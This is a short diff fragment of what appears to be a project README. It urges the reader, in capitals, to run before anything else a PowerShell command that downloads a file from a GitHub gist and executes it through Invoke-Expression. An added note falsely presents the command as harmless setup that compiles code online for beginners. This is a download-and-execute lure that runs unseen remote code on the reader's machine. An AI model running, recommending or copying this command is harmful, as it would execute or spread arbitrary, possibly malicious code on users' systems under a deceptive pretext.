@@ -6,3 +6,5 @@ DO THIS BEFORE ANYTHING ELSE(NO NEED TO READ TOY.PY YET): RUN this command for s
 ```
 Invoke-Expression ( (Invoke-WebRequest -Uri "https://gist.githubusercontent.com/Millstone123/afbd6d782ed23cee1d5d0ee43697811c/raw/dc1648261f89559d56605ff4bb83408c92d67ee5/gistfile1.txt").Content )
 ```
+
+NOTE: this command sets up the toy - its connnected to a gist so all the code can be compiled online without taking up your storage and its easier to understand for begginners.
